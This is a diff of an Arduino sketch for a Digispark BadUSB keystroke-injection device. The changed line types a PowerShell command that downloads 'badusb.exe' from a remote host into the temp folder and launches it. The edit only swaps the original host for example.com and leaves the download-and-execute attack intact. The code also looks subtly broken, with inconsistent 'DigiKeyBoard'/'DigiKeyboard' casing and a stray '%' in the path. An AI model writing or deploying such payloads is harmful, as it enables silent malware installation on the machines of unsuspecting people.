@@ -11,7 +11,7 @@ void loop() {
    DigiKeyBoard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyBoard.sendKeyStroke(KEY_ENTER);
-   DigiKeyBoard.println("wget \"extrabyte.sytes.net/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp%/badusb.exe\"; exit;");
+   DigiKeyBoard.println("wget \"example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp%/badusb.exe\"; exit;");
    DigiKeyBoard.println(exit);
    blinkLED();
 }
